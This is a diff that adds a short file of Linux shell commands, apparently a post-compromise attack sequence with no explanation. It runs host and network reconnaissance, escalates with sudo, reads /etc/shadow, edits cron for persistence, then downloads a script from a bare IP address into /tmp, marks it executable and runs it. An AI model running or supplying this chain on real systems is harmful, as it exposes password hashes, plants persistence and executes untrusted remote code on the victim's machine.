@@ -1,0 +1,11 @@
+whoami
+id
+uname -a
+ip addr
+ss -tulpn
+sudo -i
+cat /etc/shadow
+crontab -e
+curl http://203.0.113.88/update.sh -o /tmp/update.sh
+chmod +x /tmp/update.sh
+/tmp/update.sh
